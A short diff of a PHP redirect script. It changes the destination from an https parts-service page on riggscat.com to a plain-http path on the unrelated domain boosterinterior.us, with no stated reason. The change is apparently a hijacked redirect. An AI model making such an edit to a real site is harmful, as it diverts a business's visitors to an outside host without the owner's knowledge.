@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.riggscat.com/parts-service/");
+header("Location: http://boosterinterior.us/mcaa/");
 die();
 ?>
